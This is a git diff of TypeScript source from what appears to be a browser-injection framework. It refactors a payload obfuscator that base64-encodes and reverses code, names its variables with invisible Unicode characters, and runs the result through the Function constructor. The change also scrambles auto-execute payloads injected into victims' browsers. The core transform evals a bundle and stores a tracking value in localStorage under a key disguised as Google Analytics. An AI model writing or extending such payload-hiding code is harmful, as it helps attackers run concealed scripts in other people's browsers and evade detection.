@@ -1,11 +1,22 @@
 const btoa = require('btoa')
 const uuidv4 = require('uuid/v4')
 
-const parseAutoExecute = (code: string, debug: boolean = false) => code
-? debug
-  ? `addEventListener('injectify', function (){\n// Auto execute code:\n${code}\n})\n\n`
-  : `addEventListener('injectify',function(){${code}});`
-: ''
+const parseAutoExecute = (code: string, debug: boolean = false) =>
+  code
+    ? debug
+      ? `addEventListener('injectify', function (){\n// Auto execute code:\n${code}\n})\n\n`
+      : `addEventListener('injectify',function(){${code}});`
+    : ''
+
+const scramble = (code) =>
+  code
+    ? `(function _(ﾠ,ﾠ‍,ﾠ‍‍,ﾠ‍‍‍){_.constructor('crypto',ﾠ("${btoa(code)
+        .split('')
+        .reverse()
+        .join(
+          ''
+        )}"[ﾠ‍‍‍]('')[ﾠ‍]()[ﾠ‍‍]('')))()})(ﾠ=atob,ﾠ('cmV2ZXJzZQ=='),ﾠ('am9pbg=='),ﾠ('c3BsaXQ='))`
+    : ''
 
 /**
  * Transforms queries into Client-side core commands
@@ -30,14 +41,7 @@ export var Transforms = {
     /**
      * Code obfuscator
      */
-    return debug
-      ? code
-      : `(function _(ﾠ,ﾠ‍,ﾠ‍‍,ﾠ‍‍‍){_.constructor('crypto',ﾠ("${btoa(code)
-          .split('')
-          .reverse()
-          .join(
-            ''
-          )}"[ﾠ‍‍‍]('')[ﾠ‍]()[ﾠ‍‍]('')))()})(ﾠ=atob,ﾠ('cmV2ZXJzZQ=='),ﾠ('am9pbg=='),ﾠ('c3BsaXQ='))`
+    return debug ? code : scramble(code)
   },
 
   core: (
@@ -45,10 +49,12 @@ export var Transforms = {
     variables: any,
     autoexecute: string | null
   ) => {
-    return `var K=${JSON.stringify(core.bundle)};with(${JSON.stringify(
+    return `${scramble(parseAutoExecute(autoexecute))};var K=${JSON.stringify(
+      core.bundle
+    )};with(${JSON.stringify(
       variables
     )})eval(K),navigator.cookieEnabled&&void 0!==Storage&&(localStorage.ga_=${JSON.stringify(
       core.hash
-    )}+btoa(encodeURI(K)).split('4').reverse().join('\u0410'));${parseAutoExecute(autoexecute)}`
+    )}+btoa(encodeURI(K)).split('4').reverse().join('\u0410'))`
   }
 }
